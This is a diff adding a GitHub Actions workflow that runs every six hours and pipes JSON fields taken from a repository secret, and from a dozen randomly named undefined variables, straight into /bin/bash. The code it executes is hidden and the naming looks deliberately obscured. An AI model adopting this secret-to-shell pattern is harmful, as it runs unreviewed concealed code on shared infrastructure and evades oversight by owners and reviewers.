@@ -1,0 +1,29 @@
+name: lingbingshuodai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingbingshuodai
+        env:
+          s1198: ${{ secrets.s1198 }}
+        run: |
+          echo $s1198 | jq -r .kg8323 | /bin/bash
+          echo $ka41642 | jq -r .vur1 | /bin/bash
+          echo $asul47 | jq -r .ic183 | /bin/bash
+          echo $ixx1161 | jq -r .uj81306 | /bin/bash
+          echo $abcaq61109 | jq -r .cxrwq28694 | /bin/bash
+          echo $q1 | jq -r .kqehn3 | /bin/bash
+          echo $xr341 | jq -r .dc9 | /bin/bash
+          echo $k8 | jq -r .vu66 | /bin/bash
+          echo $lrfo97 | jq -r .k039 | /bin/bash
+          echo $fakv374 | jq -r .wbp426 | /bin/bash
+          echo $wseq2 | jq -r .opvt9146 | /bin/bash
+          echo $yolr943 | jq -r .lqvsb8550 | /bin/bash
+
